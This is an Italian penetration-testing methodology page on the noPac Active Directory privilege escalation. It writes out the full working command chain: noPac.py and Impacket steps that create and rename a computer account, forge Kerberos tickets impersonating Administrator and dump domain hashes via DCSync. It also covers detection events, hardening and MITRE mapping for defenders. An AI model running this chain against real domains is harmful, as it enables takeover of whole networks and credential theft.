> [English](README.en.md) | **Italiano**

# noPac: da utente di dominio a Domain Admin (CVE-2021-42278 + CVE-2021-42287)

> - **Fase:** Privilege Escalation nel dominio - sfruttamento di due CVE del flusso Kerberos/KDC
> - **Visibilita:** Media - la catena crea e rinomina un computer account (eventi a registro) e genera richieste Kerberos anomale; e rumorosa se il DC e monitorato
> - **Prerequisiti:** credenziali di un utente di dominio valido; `MachineAccountQuota > 0` (oppure un computer account gia controllato); Domain Controller **non patchato** (patch di novembre 2021 assente)
> - **Tecnica:** `noPac` | **Severity tipica:** `Critico` | **Finding ID:** da assegnare in lab (metodologia)

- Natura del documento: metodologia + catena pratica completa (Impacket e noPac.py). Valori di esempio su dominio di laboratorio (`corp.local`/`DC01`); hash redatti. Da eseguire solo in lab proprio o con autorizzazione.
- Obiettivo: comprendere come due vulnerabilita combinate consentano a un utente di dominio qualunque di impersonare un Domain Controller e arrivare a DCSync, e come rilevarle e prevenirle.

---

## Executive Summary

noPac e una delle catene di privilege escalation piu rapide e ad alto impatto in Active Directory non patchato.
Combina due vulnerabilita di novembre 2021:

- **CVE-2021-42278 (sAMAccountName spoofing):** AD non valida correttamente che un computer account abbia il
  nome terminante in `$`. Un attaccante puo rinominare un computer account sotto il proprio controllo in modo da
  coincidere con il nome di un Domain Controller (privo del `$`).
- **CVE-2021-42287 (confusione del KDC):** quando il KDC non trova il principal indicato (perche nel frattempo
  l'account e stato rinominato), esegue un fallback aggiungendo `$` e finisce per risolverlo sull'account del
  Domain Controller reale, emettendo ticket come se l'attaccante fosse il DC.

L'effetto combinato e: **impersonation del Domain Controller, poi [DCSync](<../../05-credential-dumping/dcsync/README.md>),
fino alla compromissione del dominio**. La catena tipica negli assessment combina password spraying, noPac e DCSync:
trasforma un accesso a basso privilegio nel controllo del dominio in pochissimo tempo. Severity `Critico`.

## Contesto operativo (perche, prima del come)

noPac si prova appena si ottengono credenziali di dominio valide, perche il rapporto impatto/sforzo e
altissimo: se i prerequisiti ci sono, non serve una catena lunga di ACL o delegation abuse. La decisione
operativa e la **verifica preliminare** (scan) prima di qualunque azione invasiva: occorre confermare lo stato
di patch del DC e il valore di `MachineAccountQuota` (se > 0, un utente standard puo creare un computer account,
rendendo la catena immediata; se = 0, serve un computer account gia controllato). Dal punto di vista
dell'assessment, il valore sta nel documentare se il dominio e vulnerabile e con quali prerequisiti, non nel
"lanciare l'exploit".

## Esecuzione / Comandi

### Verifica preliminare (non invasiva)

Controllo di `MachineAccountQuota` (quanti computer account puo creare un utente standard):

```bash
# Verifica del MachineAccountQuota via NetExec (modulo maq)
netexec ldap <DC_IP> -u <utente> -p '<SEGNAPOSTO>' -M maq
```

Output illustrativo (rappresentativo):

```
MAQ         MachineAccountQuota: 10    <-- > 0: un utente standard puo creare computer account
```

Molti tool (es. `noPac.py`) offrono una modalita `--scan` che valuta se il target e vulnerabile senza eseguire
la parte invasiva: e il passo corretto da documentare per primo.

### Exploit automatico con noPac.py

Lo strumento `noPac.py` (sam-the-admin) incapsula l'intera catena. Prima lo scan, poi, se vulnerabile,
l'impersonation con dump via DCSync:

```bash
# Scan: valuta la sfruttabilita senza azioni invasive
python3 noPac.py corp.local/utente:'Password123' -dc-ip 10.0.0.10 -dc-host DC01 --scan

# Exploit: impersona Administrator ed esegue secretsdump (DCSync) in un colpo
python3 noPac.py corp.local/utente:'Password123' -dc-ip 10.0.0.10 -dc-host DC01 \
  --impersonate Administrator -dump
```

Output illustrativo (hash redatti):

```
[*] Got TGT for DC01$  (sAMAccountName spoofing riuscito)
[*] Impersonating Administrator via S4U
Administrator:500:aad3b435...:3f1c2d...:::    <-- hash NTLM dell'amministratore di dominio (redatto)
krbtgt:502:aad3b435...:9a7f6e...:::           <-- hash krbtgt (abilita Golden/Diamond Ticket)
```

### Catena manuale con Impacket (per comprenderla e per il troubleshooting)

```bash
# 1. Crea un computer account (serve MachineAccountQuota > 0)
impacket-addcomputer corp.local/utente:'Password123' -dc-ip 10.0.0.10 \
  -computer-name 'NOPAC$' -computer-pass 'Comp1234!'

# 2. Rinomina il computer account facendolo coincidere col sAMAccountName del DC, SENZA la '$' (CVE-2021-42278)
impacket-renameMachine corp.local/utente:'Password123' -dc-ip 10.0.0.10 \
  -current-name 'NOPAC$' -new-name 'DC01'

# 3. Richiedi un TGT per l'account rinominato
impacket-getTGT corp.local/'DC01':'Comp1234!' -dc-ip 10.0.0.10
export KRB5CCNAME=DC01.ccache

# 4. Ripristina il nome originale del computer account (ora nel TGT resta il riferimento al DC)
impacket-renameMachine corp.local/utente:'Password123' -dc-ip 10.0.0.10 \
  -current-name 'DC01' -new-name 'NOPAC$'

# 5. Richiedi un service ticket via S4U2self: il KDC, non trovando 'DC01', fa fallback su 'DC01$' (CVE-2021-42287)
#    e rilascia un ticket nel contesto del DC reale, impersonando Administrator
impacket-getST -self -impersonate Administrator -altservice 'cifs/DC01.corp.local' \
  -k -no-pass 'corp.local/DC01'
export KRB5CCNAME=Administrator.ccache

# 6. Usa il ticket per DCSync: dump delle credenziali di dominio (incluso krbtgt)
impacket-secretsdump -k -no-pass -dc-ip 10.0.0.10 'corp.local/Administrator@DC01.corp.local' -just-dc
```

> I flag esatti (`-self`/`-altservice`, nomi dei ccache) possono variare con la versione di Impacket; in lab si
> verificano con `-debug`. Le credenziali ottenute vanno trattate come dati sensibili e redatte nel report.
Il passo 6 ([DCSync](<../../05-credential-dumping/dcsync/README.md>)) consegna l'intero dominio.

## Analisi dei risultati

Se la catena riesce, l'impatto e massimo (`Critico`): da utente di dominio a controllo completo via DCSync. Se
il DC e patchato, la catena si interrompe (il fallback del KDC non e piu sfruttabile e lo spoofing del
sAMAccountName e bloccato). Se `MachineAccountQuota = 0` e non si controlla gia un computer account, il primo
passo non e eseguibile. Documentare quale dei prerequisiti manca e parte del valore dell'assessment: indica
esattamente quale controllo sta proteggendo il dominio.

### Analisi Teorica

noPac e un difetto di **coerenza tra identita e autorizzazione** nel flusso Kerberos. CVE-2021-42278 rompe
l'assunzione che il nome di un computer account sia univoco e terminante in `$`; CVE-2021-42287 introduce un
fallback del KDC che, in presenza di quella rottura, risolve il principal sbagliato. Nessuna delle due, da sola,
sarebbe devastante: e la loro combinazione a far si che il KDC emetta, in buona fede, ticket con l'autorizzazione
di un Domain Controller. E un esempio di come due difetti "minori" di validazione compongano una escalation
critica. La contromisura e strutturale: il patching ripristina le validazioni mancanti; l'hardening
(`MachineAccountQuota = 0`, restrizione sulla creazione di computer account) riduce la superficie a monte.

## Remediation (Blue Team)

**Rilevamento.**
- Event ID **4741** (creazione di un computer account) da parte di utenti non amministrativi.
- Event ID **4742** / **4781** (modifica/rinomina di un computer account), specie verso un nome che coincide con
  un DC o la rimozione del `$`.
- Richieste Kerberos anomale su principal macchina; S4U inattesi.
- Correlazione: creazione computer account, poi rinomina, poi richiesta ticket, in rapida successione dallo
  stesso attore.

**Hardening.**
- **Patching** dei Domain Controller (patch di novembre 2021: le KB che correggono CVE-2021-42278/42287) - la
  contromisura primaria.
- Impostare `MachineAccountQuota = 0` e delegare la creazione di computer account solo a chi ne ha bisogno.
- Limitare via ACL chi puo creare oggetti computer nel dominio.
- Logging e alerting seri su creazione/rinomina di computer account.

---

## Scenario Reale: Proiezione Post-Exploitation

> Vale per lo sfruttamento riuscito su DC non patchato (severity Critico).

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** credenziali di un utente di dominio a basso privilegio (es. da password spraying).

**Passo successivo immediato:** verificare prerequisiti (patch, `MachineAccountQuota`) e, se vulnerabile,
eseguire la catena fino al DCSync.

**Kill Chain proiettata:**

```
Credenziali utente standard (es. da password spraying)
        |
        v
noPac: impersonation del Domain Controller (CVE-2021-42278 + 42287)
        |
        v
DCSync -> dump degli hash di dominio (incluso krbtgt)
        |
        v
Golden/Diamond Ticket, persistenza dominio-wide, accesso a qualunque sistema
```

**Impatto potenziale:** dal minimo privilegio al controllo totale del dominio in pochi passi. Ottenuto
l'hash di `krbtgt`, la persistenza puo diventare di lungo periodo (vedi Golden/Diamond/Sapphire).

**Vettori di monetizzazione tipici:** ransomware a livello di dominio, esfiltrazione massiva, persistenza.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** eventi 4741/4742/4781 da attori non amministrativi; sequenza creazione-rinomina-ticket;
anomalie Kerberos sui principal macchina.

**Indicatori di Compromissione (IOC):** computer account con nome che coincide con un DC o privo di `$`;
creazione di computer account seguita da attivita Kerberos privilegiata; DCSync da host non-DC.

**Contenimento:** patching immediato dei DC; `MachineAccountQuota = 0`; se compromesso krbtgt, doppio reset;
indagine sugli accessi e sui computer account recenti.

**Eradicazione e hardening:** patch, MAQ a zero, restrizione ACL sulla creazione di computer account, logging
robusto, monitoraggio DCSync (repliche da host non autorizzati).

**Lezione difensiva:** noPac dimostra che due difetti di validazione apparentemente minori, se non patchati,
compongono una delle escalation piu critiche; il patching dei DC non e opzionale e `MachineAccountQuota = 0` e
un hardening a costo quasi nullo con grande ritorno.

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `noPac.py` (sam-the-admin) | Exploit AD | CLI - Attivo | Verifica (`--scan`) e, in lab autorizzato, catena noPac automatizzata |
| `Impacket` (addcomputer, renameMachine, getTGT, getST, secretsdump) | Toolkit AD | CLI - Attivo | Esecuzione manuale dei singoli passi (comprensione e troubleshooting) |
| `NetExec` (modulo `maq`) | AD recon | CLI - Attivo | Verifica di `MachineAccountQuota` e dello stato del dominio |

## Note di metodologia

In lab reale (es. GOAD o macchina HTB con DC non patchato) documentare: lo stato di patch del DC, il valore di
`MachineAccountQuota`, l'esito dello scan e, se eseguita in contesto autorizzato, l'evidenza dell'impatto. Le
credenziali eventualmente ottenute vanno trattate come dati sensibili e redatte nel report. Il focus del
documento resta su sfruttabilita, detection e remediation, non sulla riproduzione dell'exploit.

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Privilege Escalation | Exploitation for Privilege Escalation | `T1068` | Sfruttamento combinato di CVE-2021-42278 e CVE-2021-42287 per impersonare un DC. |
| Persistence | Create Account: Domain Account | `T1136.002` | Creazione di un computer account come passo iniziale della catena. |
| Credential Access | OS Credential Dumping: DCSync | `T1003.006` | Dump delle credenziali di dominio tramite il ticket nel contesto del DC. |

## Correlazioni con altri moduli

| Provenienza | Questa tecnica | Effetto |
| :--- | :--- | :--- |
| [Password spraying](<../../../07-post-exploitation/README.md>) / credenziali iniziali | noPac | fornisce l'utente di dominio da cui parte la catena |
| noPac | [DCSync](<../../05-credential-dumping/dcsync/README.md>) | il ticket ottenuto abilita il dump delle credenziali di dominio |
| noPac (hash krbtgt) | [Golden](<../../02-kerberos-attacks/golden-ticket/README.md>) / [Diamond](<../../02-kerberos-attacks/diamond-ticket/README.md>) | la chiave di krbtgt ottenuta abilita la persistenza dominio-wide |

---

> **Nota:** Contenuto didattico. La catena e funzionante e va eseguita esclusivamente in laboratori propri (es. GOAD) o con autorizzazione esplicita. Valori di esempio su dominio di lab; output e hash illustrativi/redatti, non da sistemi reali.
